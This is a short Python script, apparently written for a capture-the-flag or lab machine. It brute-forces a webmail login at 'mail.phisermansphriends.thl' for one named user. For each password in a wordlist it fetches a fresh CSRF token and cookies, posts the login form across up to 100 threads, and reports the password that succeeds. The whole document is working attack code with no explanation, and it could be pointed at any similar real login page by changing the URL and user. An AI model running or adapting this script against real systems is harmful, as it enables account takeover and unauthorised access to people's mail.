import requests
import threading

login_correcto_evento = threading.Event()
found_pass = None

def obtencion_token():

	r = requests.get('http://mail.phisermansphriends.thl/')

	responseToken = r.text.split("\"request_token\":\"")[1].split("\"});")[0]
	return responseToken,r.cookies

def brute(password,user):

	global found_pass

	token, cookie = obtencion_token()
	payload = {
		'_token':token,
		'_task':'login',
		'_action':'login',
		'_timezone':'Europe/Madrid',
		'_url':'',
		'_user':user,
		'_pass':password
	}

	r = requests.post('http://mail.phisermansphriends.thl/?_task=login',data=payload,cookies=cookie)

	if 'Login failed' in r.text:
		print(f'[-]Failed -> {password} -- {token}')
	else:
		login_correcto_evento.set()
		found_pass = password
	
def main():

	user = "mur.rusko@phisermansphriends.thl"

	with open("mur.txt","r") as file:
		passwords = [line.strip() for line in file]

	hilos = []
	max_hilos = 100

	for password in passwords:

		if login_correcto_evento.is_set():
			break

		while threading.active_count() > max_hilos:
			pass

		hilo = threading.Thread(target=brute, args=(password,user))
		hilos.append(hilo)
		hilo.start()

	for hilo in hilos:
		hilo.join()

	if found_pass:
		print(f'[+] Login: {found_pass}')


if __name__ == '__main__':
	main()
